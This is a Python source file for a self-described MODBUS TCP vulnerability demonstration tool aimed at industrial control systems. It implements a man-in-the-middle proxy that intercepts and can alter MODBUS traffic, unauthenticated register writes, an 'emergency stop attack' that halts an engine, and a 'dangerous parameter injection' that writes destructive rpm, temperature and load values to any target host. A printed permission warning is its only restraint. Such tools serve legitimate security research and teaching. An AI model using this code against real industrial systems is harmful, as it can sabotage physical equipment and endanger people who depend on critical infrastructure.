#!/usr/bin/env python3
"""
Enhanced MODBUS TCP Vulnerability Demonstration Tool
Features:
- Man-in-the-middle proxy to intercept MODBUS traffic
- Real-time register modification
- Interactive vulnerability demonstration
- Traffic sniffing and analysis
"""

from pyModbusTCP.client import ModbusClient
from pyModbusTCP.server import ModbusServer
import threading
import time
import yaml
import argparse
import socket
import sys
import json
from pathlib import Path
from datetime import datetime
import signal
import os
import select

class ModbusProxy:
    """MODBUS TCP Man-in-the-Middle Proxy"""
    
    def __init__(self, backend_host, backend_port, proxy_port=5030):
        self.backend_host = backend_host
        self.backend_port = backend_port
        self.proxy_port = proxy_port
        self.running = False
        self.intercepted_traffic = []
        self.modified_registers = {}
        self.client_connections = []
        
    def start_proxy(self):
        """Start the proxy server"""
        print(f"Starting MODBUS Man-in-the-Middle Proxy")
        print(f"Proxy Port: {self.proxy_port}")
        print(f"Backend: {self.backend_host}:{self.backend_port}")
        print(f"Connect clients to this proxy instead of the backend")
        
        self.running = True
        self.proxy_thread = threading.Thread(target=self._proxy_server)
        self.proxy_thread.daemon = True
        self.proxy_thread.start()
        
    def _proxy_server(self):
        """Main proxy server loop"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.proxy_port))
        server_socket.listen(5)
        
        print(f"Proxy listening on port {self.proxy_port}")
        
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                print(f"Client connected from {addr}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"Proxy error: {e}")
        
        server_socket.close()
        
    def _handle_client(self, client_socket, addr):
        """Handle individual client connections"""
        try:
            # Connect to backend
            backend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backend_socket.connect((self.backend_host, self.backend_port))
            
            # Relay traffic between client and backend
            while self.running:
                ready, _, _ = select.select([client_socket, backend_socket], [], [], 1)
                
                for sock in ready:
                    if sock == client_socket:
                        # Client to backend
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        
                        # Intercept and analyze
                        self._intercept_request(data, addr)
                        
                        # Forward to backend (possibly modified)
                        modified_data = self._modify_request(data)
                        backend_socket.send(modified_data)
                        
                    elif sock == backend_socket:
                        # Backend to client
                        data = backend_socket.recv(1024)
                        if not data:
                            break
                        
                        # Intercept and analyze
                        self._intercept_response(data, addr)
                        
                        # Forward to client (possibly modified)
                        modified_data = self._modify_response(data)
                        client_socket.send(modified_data)
                        
        except Exception as e:
            print(f"Client handler error: {e}")
        finally:
            client_socket.close()
            backend_socket.close()
            print(f"Client {addr} disconnected")
    
    def _intercept_request(self, data, addr):
        """Intercept and log client requests"""
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        
        if len(data) >= 6:
            # Basic MODBUS parsing
            function_code = data[7] if len(data) > 7 else 0
            
            traffic_entry = {
                'timestamp': timestamp,
                'direction': 'CLIENT->BACKEND',
                'client': f"{addr[0]}:{addr[1]}",
                'function_code': function_code,
                'raw_data': data.hex(),
                'size': len(data)
            }
            
            self.intercepted_traffic.append(traffic_entry)
            
            # Print real-time traffic
            print(f"[{timestamp}] CLIENT->BACKEND: Function {function_code}, {len(data)} bytes")
    
    def _intercept_response(self, data, addr):
        """Intercept and log backend responses"""
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        
        if len(data) >= 6:
            function_code = data[7] if len(data) > 7 else 0
            
            traffic_entry = {
                'timestamp': timestamp,
                'direction': 'BACKEND->CLIENT',
                'client': f"{addr[0]}:{addr[1]}",
                'function_code': function_code,
                'raw_data': data.hex(),
                'size': len(data)
            }
            
            self.intercepted_traffic.append(traffic_entry)
            
            # Print real-time traffic
            print(f"[{timestamp}] BACKEND->CLIENT: Function {function_code}, {len(data)} bytes")
    
    def _modify_request(self, data):
        """Modify requests on the fly"""
        # For demo purposes, we can modify specific requests
        # For now, just pass through
        return data
    
    def _modify_response(self, data):
        """Modify responses on the fly"""
        # This is where we can inject fake data
        # For now, just pass through
        return data
    
    def stop_proxy(self):
        """Stop the proxy"""
        self.running = False
        print("Proxy stopped")
    
    def get_traffic_summary(self):
        """Get summary of intercepted traffic"""
        return {
            'total_packets': len(self.intercepted_traffic),
            'recent_traffic': self.intercepted_traffic[-10:] if self.intercepted_traffic else []
        }


class EnhancedVulnerabilityDemo:
    """Enhanced vulnerability demonstration with interactive features"""
    
    def __init__(self, config_file=None):
        """Initialize the enhanced vulnerability demo"""
        
        # Load configuration
        if config_file is None:
            config_file = Path(__file__).parent / 'config.yaml'
        
        try:
            with open(config_file, 'r') as f:
                self.config = yaml.safe_load(f)
        except FileNotFoundError:
            print(f"Warning: Config file {config_file} not found, using defaults")
            self.config = self._default_config()
        
        self.registers = self.config['registers']
        self.proxy = None
        self.monitoring = False
        
    def _default_config(self):
        """Default configuration"""
        return {
            'registers': {
                'status': 0, 'rpm': 1, 'temp': 2, 'fuel_flow': 3, 'load': 4
            }
        }
    
    def start_mitm_proxy(self, backend_host, backend_port=502, proxy_port=5030):
        """Start man-in-the-middle proxy"""
        print(f"\n{'='*60}")
        print("STARTING MAN-IN-THE-MIDDLE PROXY")
        print(f"{'='*60}")
        
        self.proxy = ModbusProxy(backend_host, backend_port, proxy_port)
        self.proxy.start_proxy()
        
        print(f"\nProxy is now running!")
        print(f"1. Configure your bridge to connect to localhost:{proxy_port}")
        print(f"2. Bridge traffic will be intercepted and forwarded to {backend_host}:{backend_port}")
        print(f"3. All MODBUS traffic will be visible in real-time")
        
    def real_time_monitor(self, host, port=502, duration=30):
        """Monitor MODBUS traffic in real-time"""
        print(f"\n{'='*60}")
        print(f"REAL-TIME MODBUS MONITORING")
        print(f"Target: {host}:{port}")
        print(f"Duration: {duration} seconds")
        print(f"{'='*60}")
        
        client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
        
        if not client.open():
            print(f"✗ Failed to connect to {host}:{port}")
            return
        
        print("Monitoring started. Press Ctrl+C to stop early.")
        
        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                # Read all registers
                for reg_name, reg_addr in self.registers.items():
                    try:
                        value = client.read_holding_registers(reg_addr, 1)
                        if value:
                            timestamp = datetime.now().strftime('%H:%M:%S')
                            print(f"[{timestamp}] {reg_name.upper()}: {value[0]} (Reg {reg_addr})")
                    except Exception as e:
                        print(f"Error reading {reg_name}: {e}")
                
                time.sleep(2)  # Monitor every 2 seconds
                
        except KeyboardInterrupt:
            print("\nMonitoring stopped by user")
        finally:
            client.close()
    
    def interactive_register_modification(self, host, port=502):
        """Interactive tool for modifying registers"""
        print(f"\n{'='*60}")
        print("INTERACTIVE REGISTER MODIFICATION")
        print(f"Target: {host}:{port}")
        print(f"{'='*60}")
        
        client = ModbusClient(host=host, port=port, auto_open=True, auto_close=True)
        
        if not client.open():
            print(f"✗ Failed to connect to {host}:{port}")
            return
        
        print("\nAvailable registers:")
        for reg_name, reg_addr in self.registers.items():
            print(f"  {reg_name} (register {reg_addr})")
        
        try:
            while True:
                print(f"\n{'-'*40}")
                print("Options:")
                print("1. Read all registers")
                print("2. Modify specific register")
                print("3. Emergency stop attack")
                print("4. Dangerous parameter injection")
                print("5. Exit")
                
                choice = input("\nEnter your choice (1-5): ").strip()
                
                if choice == '1':
                    self._read_all_registers_interactive(client)
                elif choice == '2':
                    self._modify_register_interactive(client)
                elif choice == '3':
                    self._emergency_stop_attack(client)
                elif choice == '4':
                    self._dangerous_parameter_attack(client)
                elif choice == '5':
                    break
                else:
                    print("Invalid choice. Please try again.")
                    
        except KeyboardInterrupt:
            print("\nExiting...")
        finally:
            client.close()
    
    def _read_all_registers_interactive(self, client):
        """Read all registers interactively"""
        print(f"\n{'='*40}")
        print("CURRENT REGISTER VALUES")
        print(f"{'='*40}")
        
        for reg_name, reg_addr in self.registers.items():
            try:
                value = client.read_holding_registers(reg_addr, 1)
                if value:
                    raw_value = value[0]
                    
                    # Convert special values
                    if reg_name == 'fuel_flow':
                        display_value = raw_value / 100.0
                    else:
                        display_value = raw_value
                    
                    print(f"  {reg_name.upper()}: {display_value} (Raw: {raw_value}, Reg: {reg_addr})")
                else:
                    print(f"  {reg_name.upper()}: Failed to read (Reg: {reg_addr})")
            except Exception as e:
                print(f"  {reg_name.upper()}: Error - {e}")
    
    def _modify_register_interactive(self, client):
        """Modify a specific register interactively"""
        print(f"\n{'-'*40}")
        print("REGISTER MODIFICATION")
        print(f"{'-'*40}")
        
        print("Available registers:")
        reg_list = list(self.registers.items())
        for i, (reg_name, reg_addr) in enumerate(reg_list):
            print(f"  {i+1}. {reg_name} (register {reg_addr})")
        
        try:
            reg_choice = int(input("\nSelect register to modify (number): ")) - 1
            if reg_choice < 0 or reg_choice >= len(reg_list):
                print("Invalid register selection")
                return
            
            reg_name, reg_addr = reg_list[reg_choice]
            
            # Read current value
            current = client.read_holding_registers(reg_addr, 1)
            if current:
                print(f"Current value of {reg_name}: {current[0]}")
            
            new_value = int(input(f"Enter new value for {reg_name}: "))
            
            # Confirm dangerous actions
            if reg_name == 'status' and new_value == 0:
                confirm = input("⚠️  This will STOP the engine! Are you sure? (yes/no): ")
                if confirm.lower() != 'yes':
                    print("Operation cancelled")
                    return
            
            # Write the value
            success = client.write_single_register(reg_addr, new_value)
            
            if success:
                print(f"✓ Successfully wrote {new_value} to {reg_name}")
                
                # Verify
                time.sleep(0.5)
                verify = client.read_holding_registers(reg_addr, 1)
                if verify:
                    print(f"✓ Verification: {reg_name} now reads {verify[0]}")
                
                # Show security implications
                print(f"\n{'!'*40}")
                print("SECURITY IMPLICATIONS:")
                print(f"✗ {reg_name} modified without authentication")
                print("✗ No access control or authorization")
                print("✗ Critical system parameters vulnerable")
                print(f"{'!'*40}")
            else:
                print(f"✗ Failed to write to {reg_name}")
                
        except ValueError:
            print("Invalid input. Please enter a number.")
        except Exception as e:
            print(f"Error: {e}")
    
    def _emergency_stop_attack(self, client):
        """Demonstrate emergency stop attack"""
        print(f"\n{'!'*60}")
        print("EMERGENCY STOP ATTACK DEMONSTRATION")
        print(f"{'!'*60}")
        
        # Read current status
        current = client.read_holding_registers(self.registers['status'], 1)
        if current:
            print(f"Current engine status: {current[0]}")
            
            if current[0] == 0:
                print("Engine is already stopped")
                return
        
        print("⚠️  INITIATING UNAUTHORIZED EMERGENCY STOP")
        print("⚠️  This demonstrates how an attacker could stop critical systems")
        
        countdown = 5
        try:
            while countdown > 0:
                print(f"Attack in {countdown} seconds... (Press Ctrl+C to abort)")
                time.sleep(1)
                countdown -= 1
        except KeyboardInterrupt:
            print("\nAttack aborted by user")
            return
        
        # Execute attack
        success = client.write_single_register(self.registers['status'], 0)
        
        if success:
            print(f"\n{'!'*60}")
            print("ATTACK SUCCESSFUL - ENGINE STOPPED")
            print(f"{'!'*60}")
            
            # Show impact
            time.sleep(1)
            verify = client.read_holding_registers(self.registers['status'], 1)
            if verify:
                print(f"Engine status after attack: {verify[0]}")
        else:
            print("Attack failed")
    
    def _dangerous_parameter_attack(self, client):
        """Demonstrate dangerous parameter manipulation"""
        print(f"\n{'!'*60}")
        print("DANGEROUS PARAMETER INJECTION ATTACK")
        print(f"{'!'*60}")
        
        dangerous_values = [
            ('rpm', 9999, "Setting RPM to destructive level"),
            ('temp', 999, "Setting temperature to critical failure point"),
            ('load', 200, "Setting load beyond safe operational limits")
        ]
        
        for param, value, description in dangerous_values:
            if param in self.registers:
                print(f"\n{description}...")
                reg_addr = self.registers[param]
                
                # Read current
                current = client.read_holding_registers(reg_addr, 1)
                if current:
                    print(f"  Current {param}: {current[0]}")
                
                # Inject dangerous value
                success = client.write_single_register(reg_addr, value)
                if success:
                    print(f"  ✓ Injected dangerous value: {value}")
                    
                    # Verify
                    time.sleep(0.5)
                    verify = client.read_holding_registers(reg_addr, 1)
                    if verify:
                        print(f"  ✓ {param} now reads: {verify[0]}")
                        
                        # Show impact
                        print(f"  ⚠️  IMPACT: {param} set to potentially destructive level")
                else:
                    print(f"  ✗ Failed to inject value for {param}")
        
        print(f"\n{'!'*60}")
        print("CRITICAL SECURITY FINDINGS:")
        print("✗ No validation of parameter ranges")
        print("✗ No safety limits enforced")
        print("✗ Critical systems vulnerable to manipulation")
        print("✗ No authentication for dangerous operations")
        print(f"{'!'*60}")


def main():
    """Main entry point for enhanced vulnerability demo"""
    parser = argparse.ArgumentParser(description='Enhanced MODBUS TCP Vulnerability Demo')
    parser.add_argument('host', help='Target MODBUS server IP address')
    parser.add_argument('--port', type=int, default=502, help='MODBUS TCP port (default: 502)')
    parser.add_argument('--config', help='Path to configuration file')
    parser.add_argument('--proxy', action='store_true', help='Start man-in-the-middle proxy')
    parser.add_argument('--proxy-port', type=int, default=5030, help='Proxy port (default: 5030)')
    parser.add_argument('--monitor', type=int, help='Real-time monitoring duration (seconds)')
    parser.add_argument('--interactive', action='store_true', help='Interactive register modification')
    
    args = parser.parse_args()
    
    # Create enhanced demo instance
    demo = EnhancedVulnerabilityDemo(config_file=args.config)
    
    print("Enhanced MODBUS TCP Vulnerability Demonstration Tool")
    print("=" * 60)
    print(f"Target: {args.host}:{args.port}")
    print("WARNING: This tool demonstrates real security vulnerabilities")
    print("Only use on systems you own or have permission to test")
    print("=" * 60)
    
    try:
        if args.proxy:
            demo.start_mitm_proxy(args.host, args.port, args.proxy_port)
            print("\nProxy is running. Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
        elif args.monitor:
            demo.real_time_monitor(args.host, args.port, args.monitor)
        elif args.interactive:
            demo.interactive_register_modification(args.host, args.port)
        else:
            # Default: interactive mode
            demo.interactive_register_modification(args.host, args.port)
            
    except KeyboardInterrupt:
        print("\nStopping demonstration...")
        if demo.proxy:
            demo.proxy.stop_proxy()


if __name__ == "__main__":
    main() 